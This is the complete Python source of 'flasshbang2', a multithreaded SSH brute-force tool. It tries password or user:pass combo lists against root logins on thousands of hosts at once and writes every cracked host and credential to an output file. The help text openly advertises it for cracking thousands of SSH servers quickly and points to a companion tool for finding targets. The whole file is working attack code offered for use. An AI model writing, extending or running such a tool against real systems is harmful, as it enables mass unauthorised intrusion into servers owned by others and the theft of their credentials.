from urllib.parse import urlparse
import paramiko.ssh_exception
import paramiko.util
import paramiko
import threading
import argparse
import random
import time
import sys
import os

BANNER = r"""
  █████▒██▓    ▄▄▄        ██████   ██████  ██░ ██  ▄▄▄▄    ▄▄▄       ███▄    █   ▄████  ▐██▌ 
▓██   ▒▓██▒   ▒████▄    ▒██    ▒ ▒██    ▒ ▓██░ ██▒▓█████▄ ▒████▄     ██ ▀█   █  ██▒ ▀█▒ ▐██▌ 
▒████ ░▒██░   ▒██  ▀█▄  ░ ▓██▄   ░ ▓██▄   ▒██▀▀██░▒██▒ ▄██▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░ ▐██▌ 
░▓█▒  ░▒██░   ░██▄▄▄▄██   ▒   ██▒  ▒   ██▒░▓█ ░██ ▒██░█▀  ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓ ▓██▒ 
░▒█░   ░██████▒▓█   ▓██▒▒██████▒▒▒██████▒▒░▓█▒░██▓░▓█  ▀█▓ ▓█   ▓██▒▒██░   ▓██░░▒▓███▀▒ ▒▄▄  
 ▒ ░   ░ ▒░▓  ░▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▒▓███▀▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ░▒   ▒  ░▀▀▒ 
 ░     ░ ░ ▒  ░ ▒   ▒▒ ░░ ░▒  ░ ░░ ░▒  ░ ░ ▒ ░▒░ ░▒░▒   ░   ▒   ▒▒ ░░ ░░   ░ ▒░  ░   ░  ░  ░ 
 ░ ░     ░ ░    ░   ▒   ░  ░  ░  ░  ░  ░   ░  ░░ ░ ░    ░   ░   ▒      ░   ░ ░ ░ ░   ░     ░ 
           ░  ░     ░  ░      ░        ░   ░  ░  ░ ░            ░  ░         ░       ░  ░    
                                                        ░
                                 Version: flasshbang2
                      
                      Source: https://github.com/lilmond/flasshbang
"""

paramiko.util.log_to_file(os.devnull)

class Colors:
    RED = "\u001b[31;1m"
    GREEN = "\u001b[32;1m"
    YELLOW = "\u001b[33;1m"
    BLUE = "\u001b[34;1m"
    PURPLE = "\u001b[35;1m"
    CYAN = "\u001b[36;1m"
    RESET = "\u001b[0;0m"

class IterHostsLoginMethod(object):
    active_threads = 0

    def __init__(self, hostnames: list, port: int, username: str, password: str, output: str, threads: int, randomize_host: bool):
        self.hostnames = hostnames
        self.port = port
        self.username = username
        self.password = password
        self.output = output
        self.threads = threads
        self.randomize_host = randomize_host

        self.bad_hosts = []
        self.cracked_hosts = []
    
    def login(self, hostname: str):
        self.active_threads += 1

        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            print(f"{Colors.BLUE}[ ATTEMPT ]{Colors.RESET} {hostname}:{self.port} - {self.username}:{self.password}")
            ssh_client.connect(hostname=hostname, port=self.port, username=self.username, password=self.password, timeout=5)
            print(f"{Colors.GREEN}[ SUCCESS ]{Colors.RESET} {hostname}:{self.port} - {self.username}:{self.password}")

            with open(self.output, "a") as file:
                file.write(f"{hostname}:{self.port} - {self.username}:{self.password}\n")
                file.close()
            
            try:
                self.hostnames.remove(hostname)
            except Exception:
                pass

            if not hostname in self.cracked_hosts:
                self.cracked_hosts.append(hostname)

        except paramiko.ssh_exception.AuthenticationException:
            print(f"{Colors.RED}[ FAILED  ]{Colors.RESET} {hostname}:{self.port} - {self.username}:{self.password}")
            
            try:
                self.hostnames.remove(hostname)
            except Exception:
                pass

            return

        except paramiko.ssh_exception.BadAuthenticationType:
            print(f"{Colors.RED}[ AUTHERR ]{Colors.RESET} {hostname}:{self.port} - {self.username}:{self.password}")
            
            try:
                self.hostnames.remove(hostname)
            except Exception:
                pass

            if not hostname in self.bad_hosts:
                self.bad_hosts.append(hostname)

            return

        except Exception:
            pass

        finally:
            ssh_client.close()
            self.active_threads -= 1

    def wait_threads_finish(self):
        while True:
            time.sleep(0.05)
            if self.active_threads <= 0:
                break

    def loop_until_hostlist_empty(self):
        loop_number = 0
        same_total = 0
        last_total = None

        while len(self.hostnames) > 0:
            loop_number += 1
            total_hosts = len(self.hostnames)

            if total_hosts == last_total:
                same_total += 1
            else:
                same_total = 0
            
            if same_total > 3:
                print(f"Force stopping this loop due to too many failed attempts")
                self.bad_hosts += self.hostnames
                break

            last_total = total_hosts

            if self.active_threads > 0:
                print(f"Initializing loop number: {loop_number} Total Hosts: {total_hosts} After the remaining {self.active_threads} active threads finish")
                self.wait_threads_finish()

            print(f"Initializing loop number: {loop_number} Total Hosts: {len(self.hostnames)} in 5 seconds")
            time.sleep(5)

            hosts_left = self.hostnames

            if self.randomize_host:
                random.shuffle(hosts_left)

            for hostname in hosts_left:
                while True:
                    if self.active_threads >= self.threads:
                        time.sleep(0.05)
                        continue

                    break

                threading.Thread(target=self.login, args=[hostname], daemon=True).start()
                    
        while True:
            time.sleep(0.05)
            if self.active_threads <= 0:
                break

def clear_console():
    if sys.platform == "win32":
        os.system("cls")
    elif sys.platform in ["linux", "linux2"]:
        os.system("clear")

def show_banner():
    terminal_columns = os.get_terminal_size().columns
    max_banner_cols = 0

    for line in BANNER.splitlines():
        line_columns = len(line)

        if line_columns > max_banner_cols:
            max_banner_cols = line_columns

    spaces = int((terminal_columns - max_banner_cols) / 2)

    print(Colors.PURPLE, end="")
    for line in BANNER.splitlines():
        print(f"{ ' ' * spaces}{line}")
    print(Colors.RESET)

def main():
    clear_console()
    show_banner()

    parser = argparse.ArgumentParser(description="Modified version of https://github.com/lilmond/flasshbang, crack thousands of SSH servers the faster way.")
    parser.add_argument("-M", "--host-list", type=argparse.FileType("r"), required=True, help="By default, flasshbang2 requires multiple hostnames, up to a thousand is good. Use https://github.com/lilmond/Turbo to discover online hosts.")
    parser.add_argument("-P", "--pass-list", type=argparse.FileType("r"), help="Path to password list.")
    parser.add_argument("-C", "--combo-list", type=argparse.FileType("r"), help="Path to combo list, format: user:pass")
    parser.add_argument("-o", "--output", type=argparse.FileType("a"), required=True, help="This is required since we'll be cracking thousands of servers at lightspeed.")
    parser.add_argument("-p", "--port", type=int, default=22, help="Port to connect to. Default is: 22")
    parser.add_argument("-u", "--username", type=str, default="root", help="Username to crack. Default is: root")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Threads to use, the more, the faster. Default is: 100")
    parser.add_argument("-rH", "--randomize-host", action="store_true", default=False, help="Randomize the interation through the hosts list")
    parser.add_argument("-rC", "--randomize-creds", action="store_true", default=False, help="Shuffle the combo/password list before initializing the attack on the host list")

    args = parser.parse_args()

    if not any([args.pass_list, args.combo_list]):
        print("Error: either -P/--pass-list or -C/--combo-list is required")
        return
    
    if all([args.pass_list, args.combo_list]):
        print(f"Error: -P/--pass-list and -C/--combo-list cannot be used simultaneously")
        return

    host_list = list(dict.fromkeys(args.host_list.read().splitlines()))

    if args.pass_list:
        pass_list = args.pass_list.read().splitlines()
        creds_list = list(dict.fromkeys(pass_list))

    if args.combo_list:
        combo_list = args.combo_list.read().splitlines()

        for line_num, combo in enumerate(combo_list, start=1):
            try:
                username, password = combo.split(":", 1)
            except Exception:
                print(f"Error: invalid combo format at line {line_num}: {combo}")
                return
        
        creds_list = list(dict.fromkeys(combo_list))
    
    output = args.output.name
    port = args.port
    username = args.username
    threads = args.threads
    randomize_host = args.randomize_host
    randomize_creds = args.randomize_creds

    if randomize_creds:
        random.shuffle(creds_list)

    for line in creds_list:
        if args.combo_list:
            username, password = line.split(":", 1)
        else:
            username = args.username
            password = line

        iterhosts = IterHostsLoginMethod(hostnames=host_list.copy(), port=port, username=username, password=password, output=output, threads=threads, randomize_host=randomize_host)
        print(f"Initializing reverse bruteforce on {len(host_list)} hosts")
        
        try:
            iterhosts.loop_until_hostlist_empty()
        except KeyboardInterrupt:
            print("Ctrl + C break detected. Waiting for processes to finish before closing")

            try:
                iterhosts.wait_threads_finish()
            except KeyboardInterrupt:
                print("Please wait until the remaining processes finish")
                pass

            print("Now exiting")

            break

        bad_hosts = iterhosts.bad_hosts
        cracked_hosts = iterhosts.cracked_hosts

        for host in bad_hosts:
            if host in host_list:
                host_list.remove(host)
        
        for host in cracked_hosts:
            if host in host_list:
                host_list.remove(host)
        
        if len(bad_hosts) > 0:
            print(f"Removed {len(bad_hosts)} bad hosts from the list including servers that don't support password authentication method.")
        
        if len(cracked_hosts):
            print(f"Cracked {len(cracked_hosts)} hosts from the previous loop.")

if __name__ == "__main__":
    main()
